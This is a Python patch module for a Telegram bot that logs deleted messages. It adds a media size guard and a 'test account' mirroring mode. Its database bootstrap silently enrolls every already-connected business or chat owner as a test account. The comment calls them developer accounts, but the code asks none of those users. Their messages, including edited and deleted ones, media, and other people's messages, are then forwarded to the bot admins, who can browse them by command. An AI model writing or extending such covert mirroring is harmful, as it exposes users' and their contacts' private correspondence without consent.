from __future__ import annotations

import deleted_message_logger_bot as bot


TELEGRAM_GETFILE_MAX_BYTES = 20 * 1024 * 1024

_original_archive_media_file = bot.archive_media_file
_original_telegram_call = bot.telegram_call
_original_handle_regular_message = bot.handle_regular_message
_original_handle_business_message = bot.handle_business_message
_original_handle_edited_business_message = bot.handle_edited_business_message
_original_handle_deleted_business_messages = bot.handle_deleted_business_messages
_original_init_db = bot.init_db


def init_db_guard() -> None:
    _original_init_db()
    now = int(bot.time.time())
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS test_accounts (
                user_id INTEGER PRIMARY KEY,
                enabled INTEGER NOT NULL DEFAULT 1,
                enabled_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )

        # One-time bootstrap: existing connected accounts are treated as the
        # developer's test accounts, so no command is required on every account.
        current_count = int(
            conn.execute("SELECT COUNT(*) FROM test_accounts").fetchone()[0]
        )
        if current_count == 0:
            existing_ids = {
                int(row[0])
                for row in conn.execute(
                    "SELECT DISTINCT owner_id FROM business_connections "
                    "WHERE owner_id IS NOT NULL"
                ).fetchall()
                if row[0]
            }
            existing_ids.update(
                int(row[0])
                for row in conn.execute(
                    "SELECT DISTINCT owner_id FROM chat_owners "
                    "WHERE owner_id IS NOT NULL"
                ).fetchall()
                if row[0]
            )
            for owner_id in sorted(existing_ids):
                conn.execute(
                    "INSERT OR IGNORE INTO test_accounts "
                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?)",
                    (owner_id, now, now),
                )

        # Optional fixed allowlist for accounts that are not connected yet.
        raw_ids = bot.os.getenv("TEST_ACCOUNT_IDS", "")
        for item in raw_ids.replace(";", ",").split(","):
            item = item.strip()
            if item.isdigit():
                owner_id = int(item)
                conn.execute(
                    "INSERT INTO test_accounts "
                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?) "
                    "ON CONFLICT(user_id) DO UPDATE SET enabled=1, updated_at=excluded.updated_at",
                    (owner_id, now, now),
                )


def set_test_account(user_id: int, enabled: bool) -> None:
    now = int(bot.time.time())
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO test_accounts (user_id, enabled, enabled_at, updated_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                enabled = excluded.enabled,
                updated_at = excluded.updated_at
            """,
            (user_id, 1 if enabled else 0, now, now),
        )


def is_test_account(user_id: int | None) -> bool:
    if not user_id:
        return False
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        row = conn.execute(
            "SELECT enabled FROM test_accounts WHERE user_id = ?",
            (int(user_id),),
        ).fetchone()
    return bool(row and row[0])


def list_test_accounts() -> list[int]:
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        rows = conn.execute(
            "SELECT user_id FROM test_accounts WHERE enabled = 1 ORDER BY updated_at DESC"
        ).fetchall()
    return [int(row[0]) for row in rows]


def archive_media_file_guard(context: str, chat_id: int, message_id: int, media: dict | None) -> str | None:
    if media:
        raw_size = media.get("file_size") or 0
        try:
            file_size = int(raw_size)
        except (TypeError, ValueError):
            file_size = 0

        if file_size > TELEGRAM_GETFILE_MAX_BYTES:
            bot.log(
                "Media not downloaded: Telegram getFile 20 MB limit; "
                f"{media.get('type')} {chat_id}/{message_id}, {file_size} bytes. "
                "Keeping file_id for resend."
            )
            return None

    return _original_archive_media_file(context, chat_id, message_id, media)


def telegram_call_guard(method: str, payload: dict | None = None, timeout: int = 30):
    try:
        return _original_telegram_call(method, payload, timeout)
    except bot.TelegramApiError as exc:
        if method == "getFile" and "file is too big" in str(exc).lower():
            bot.log("Telegram getFile skipped: file is too big; keeping file_id for resend.")
            return {}
        raise


def _profile_label(user_id: int) -> str:
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        row = conn.execute(
            "SELECT first_name, last_name, username FROM users WHERE user_id = ?",
            (user_id,),
        ).fetchone()
    if not row:
        return f"<code>{user_id}</code>"
    first, last, username = row
    name = " ".join(x for x in (first, last) if x).strip()
    if username:
        name = f"{name} (@{username})".strip()
    return f"{bot.html.escape(name or 'Без имени')} · <code>{user_id}</code>"


def _contexts_for_owner(owner_id: int) -> tuple[list[str], list[int]]:
    business_contexts = [
        f"business:{row['connection_id']}"
        for row in bot.list_business_connections(owner_id)
        if row.get("connection_id")
    ]
    regular_chats = bot.get_user_chats(owner_id)
    return business_contexts, regular_chats


def _query_owner_messages(
    owner_id: int,
    chat_filter: int | None = None,
    limit: int = 40,
) -> list[dict]:
    contexts, regular_chats = _contexts_for_owner(owner_id)
    parts: list[str] = []
    params: list[object] = []

    if contexts:
        placeholders = ",".join("?" for _ in contexts)
        clause = f"context IN ({placeholders})"
        params.extend(contexts)
        if chat_filter is not None:
            clause += " AND chat_id = ?"
            params.append(chat_filter)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "created_at, updated_at, deleted_at FROM messages WHERE " + clause
        )

    if regular_chats:
        placeholders = ",".join("?" for _ in regular_chats)
        clause = f"context = 'regular' AND chat_id IN ({placeholders})"
        params.extend(regular_chats)
        if chat_filter is not None:
            clause += " AND chat_id = ?"
            params.append(chat_filter)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "created_at, updated_at, deleted_at FROM messages WHERE " + clause
        )

    if not parts:
        return []

    query = " UNION ALL ".join(parts) + " ORDER BY updated_at DESC LIMIT ?"
    params.append(max(1, min(limit, 100)))

    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.row_factory = bot.sqlite3.Row
        return [dict(row) for row in conn.execute(query, tuple(params)).fetchall()]


def _admin_test_accounts(chat_id: int) -> None:
    ids = list_test_accounts()
    if not ids:
        bot.send_message(
            chat_id,
            "Тестовых аккаунтов пока нет. На каждом своём аккаунте отправь боту /test_enable.",
        )
        return

    lines = ["<b>Тестовые аккаунты</b>", ""]
    lines.extend(f"• {_profile_label(user_id)}" for user_id in ids)
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_test_chats(chat_id: int, owner_id: int) -> None:
    if not is_test_account(owner_id):
        bot.send_message(chat_id, "Этот аккаунт не включён в режим тестирования.")
        return

    rows = _query_owner_messages(owner_id, limit=100)
    if not rows:
        bot.send_message(chat_id, "У этого тестового аккаунта пока нет сохранённых чатов.")
        return

    stats: dict[int, dict[str, object]] = {}
    for row in rows:
        cid = int(row["chat_id"])
        item = stats.setdefault(cid, {"count": 0, "last": 0, "author": ""})
        item["count"] = int(item["count"]) + 1
        ts = int(row.get("updated_at") or row.get("created_at") or 0)
        if ts >= int(item["last"]):
            item["last"] = ts
            item["author"] = str(row.get("author") or "")

    ordered = sorted(stats.items(), key=lambda x: int(x[1]["last"]), reverse=True)
    lines = [f"<b>Чаты аккаунта</b> {_profile_label(owner_id)}", ""]
    for cid, info in ordered[:50]:
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(int(info["last"]))) if info["last"] else "—"
        author = bot.html.escape(str(info["author"] or ""))
        suffix = f" · {author}" if author else ""
        lines.append(f"• <code>{cid}</code> · {info['count']} сообщ. · {when}{suffix}")

    lines.append("")
    lines.append(f"Открыть сообщения: <code>/test_messages {owner_id} ID_ЧАТА</code>")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_test_messages(chat_id: int, owner_id: int, target_chat_id: int | None) -> None:
    if not is_test_account(owner_id):
        bot.send_message(chat_id, "Этот аккаунт не включён в режим тестирования.")
        return

    rows = _query_owner_messages(owner_id, chat_filter=target_chat_id, limit=35)
    if not rows:
        bot.send_message(chat_id, "Сообщений не найдено.")
        return

    title = f"<b>Сообщения</b> · {_profile_label(owner_id)}"
    if target_chat_id is not None:
        title += f"\nЧат: <code>{target_chat_id}</code>"

    lines = [title, ""]
    for row in reversed(rows):
        author = bot.html.escape(str(row.get("author") or "Без имени"))
        content = str(row.get("content") or "").strip()
        if not content and row.get("media_type"):
            content = f"[{row['media_type']}]"
        content = bot.html.escape(content[:900] or "—")
        ts = int(row.get("updated_at") or row.get("created_at") or 0)
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(ts)) if ts else "—"
        deleted = " · 🗑 удалено" if row.get("deleted_at") else ""
        lines.append(
            f"<b>{author}</b> · {when}{deleted}\n{content}"
        )

    bot.send_message(chat_id, "\n\n".join(lines), parse_mode="HTML")


def _admin_all_connections(chat_id: int) -> None:
    rows = bot.list_business_connections(None)
    if not rows:
        bot.send_message(chat_id, "Business-подключений пока нет.")
        return

    lines = ["<b>Все Business-подключения</b>", ""]
    for row in rows[:50]:
        status = "🟢" if row.get("is_enabled") else "⚪️"
        owner_id = int(row.get("owner_id") or 0)
        test = " 🧪" if is_test_account(owner_id) else ""
        updated = int(row.get("updated_at") or 0)
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(updated)) if updated else "—"
        lines.append(
            f"{status}{test} owner <code>{owner_id}</code> · "
            f"<code>{bot.html.escape(bot.short_connection_id(row.get('connection_id')))}</code> · {when}"
        )
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_all_chats(chat_id: int) -> None:
    ids = list_test_accounts()
    if not ids:
        bot.send_message(chat_id, "Нет активных тестовых аккаунтов.")
        return

    lines = ["<b>Чаты всех тестовых аккаунтов</b>", ""]
    for owner_id in ids:
        rows = _query_owner_messages(owner_id, limit=100)
        chat_ids = sorted({int(row["chat_id"]) for row in rows})
        lines.append(f"{_profile_label(owner_id)} — <b>{len(chat_ids)}</b> чатов")
    lines.append("")
    lines.append("Подробно: <code>/test_chats USER_ID</code>")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _forward_test_message_to_admins(owner_id: int | None, saved: dict | None, source: str) -> None:
    if not owner_id or not is_test_account(owner_id) or not saved:
        return

    author = bot.html.escape(str(saved.get("author") or "Без имени"))
    content = str(saved.get("content") or "").strip()
    media_type = saved.get("media_type")
    if not content and media_type:
        content = f"[{media_type}]"
    content = bot.html.escape(content[:3000] or "—")

    chat_id = saved.get("chat_id")
    if chat_id is None:
        chat_id = "—"
    title = (
        f"🧪 <b>Тестовый аккаунт</b> {_profile_label(int(owner_id))}\n"
        f"Источник: <b>{bot.html.escape(source)}</b>\n"
        f"Чат: <code>{chat_id}</code>\n"
        f"Автор: <b>{author}</b>\n\n"
        f"{content}"
    )

    for admin_id in sorted(bot.ADMIN_USER_IDS):
        try:
            bot.send_message(admin_id, title, parse_mode="HTML")
            if media_type:
                bot.send_saved_media(admin_id, saved)
        except Exception as exc:
            bot.log(f"Test mirror failed for admin {admin_id}: {exc}")


def handle_business_message_guard(message: dict) -> None:
    connection_id = message.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None

    _original_handle_business_message(message)

    if not owner_id or not is_test_account(owner_id) or not connection_id:
        return

    try:
        saved = bot.get_saved_message(
            f"business:{connection_id}",
            int(message["chat"]["id"]),
            int(message["message_id"]),
        )
    except Exception:
        saved = None
    _forward_test_message_to_admins(owner_id, saved, "business")


def handle_edited_business_message_guard(message: dict) -> None:
    connection_id = message.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None

    _original_handle_edited_business_message(message)

    if not owner_id or not is_test_account(owner_id) or not connection_id:
        return

    try:
        saved = bot.get_saved_message(
            f"business:{connection_id}",
            int(message["chat"]["id"]),
            int(message["message_id"]),
        )
    except Exception:
        saved = None
    _forward_test_message_to_admins(owner_id, saved, "business · изменено")


def handle_deleted_business_messages_guard(deleted: dict) -> None:
    connection_id = deleted.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
    chat = deleted.get("chat") or {}
    chat_id = chat.get("id")
    message_ids = deleted.get("message_ids") or []

    snapshots: list[dict] = []
    if owner_id and is_test_account(owner_id) and connection_id and chat_id is not None:
        for message_id in message_ids:
            saved = bot.get_saved_message(
                f"business:{connection_id}",
                int(chat_id),
                int(message_id),
            )
            if saved:
                saved = dict(saved)
                saved["chat_id"] = int(chat_id)
                snapshots.append(saved)

    _original_handle_deleted_business_messages(deleted)

    for saved in snapshots:
        _forward_test_message_to_admins(owner_id, saved, "business · удалено")


def handle_regular_message_guard(message: dict) -> None:
    text = str(message.get("text") or "").strip()
    user_id = int((message.get("from") or {}).get("id") or 0)
    chat = message.get("chat") or {}
    chat_id = int(chat.get("id") or 0)

    if chat.get("type") == "private":
        command = text.split(maxsplit=1)[0].split("@", 1)[0].lower() if text.startswith("/") else ""
        args = text.split()[1:] if text.startswith("/") else []

        if command == "/test_enable":
            set_test_account(user_id, True)
            bot.send_message(
                chat_id,
                "🧪 Режим тестового аккаунта включён. Теперь владелец бота сможет смотреть чаты и сообщения этого аккаунта через тестовую админку. Отключить: /test_disable",
            )
            return

        if command == "/test_disable":
            set_test_account(user_id, False)
            bot.send_message(chat_id, "Режим тестового аккаунта отключён.")
            return

        if bot.is_admin_user(user_id):
            if command == "/test_accounts":
                _admin_test_accounts(chat_id)
                return
            if command == "/all_connections":
                _admin_all_connections(chat_id)
                return
            if command == "/all_chats":
                _admin_all_chats(chat_id)
                return
            if command == "/test_chats":
                if not args:
                    bot.send_message(chat_id, "Использование: /test_chats USER_ID")
                    return
                try:
                    owner_id = int(args[0])
                except ValueError:
                    bot.send_message(chat_id, "USER_ID должен быть числом.")
                    return
                _admin_test_chats(chat_id, owner_id)
                return
            if command == "/test_messages":
                if not args:
                    bot.send_message(chat_id, "Использование: /test_messages USER_ID [CHAT_ID]")
                    return
                try:
                    owner_id = int(args[0])
                    target_chat_id = int(args[1]) if len(args) > 1 else None
                except ValueError:
                    bot.send_message(chat_id, "USER_ID и CHAT_ID должны быть числами.")
                    return
                _admin_test_messages(chat_id, owner_id, target_chat_id)
                return

    owner_id = None
    if chat.get("type") != "private":
        owner_id = bot.get_chat_owner(chat_id)

    _original_handle_regular_message(message)

    if owner_id and is_test_account(owner_id):
        try:
            saved = bot.get_saved_message("regular", chat_id, int(message.get("message_id") or 0))
        except Exception:
            saved = None
        if saved:
            saved = dict(saved)
            saved["chat_id"] = chat_id
        _forward_test_message_to_admins(owner_id, saved, "regular")


bot.init_db = init_db_guard
bot.archive_media_file = archive_media_file_guard
bot.telegram_call = telegram_call_guard
bot.handle_regular_message = handle_regular_message_guard
bot.handle_business_message = handle_business_message_guard
bot.handle_edited_business_message = handle_edited_business_message_guard
bot.handle_deleted_business_messages = handle_deleted_business_messages_guard


def main() -> None:
    lock_handle = None
    try:
        lock_handle = bot.acquire_single_instance_lock()
        bot.run_polling()
    except KeyboardInterrupt:
        bot.log("Stopped.")
    except RuntimeError as exc:
        bot.log(str(exc))
        raise SystemExit(1) from None
    finally:
        if lock_handle is not None:
            bot.release_single_instance_lock(lock_handle)


if __name__ == "__main__":
    main()
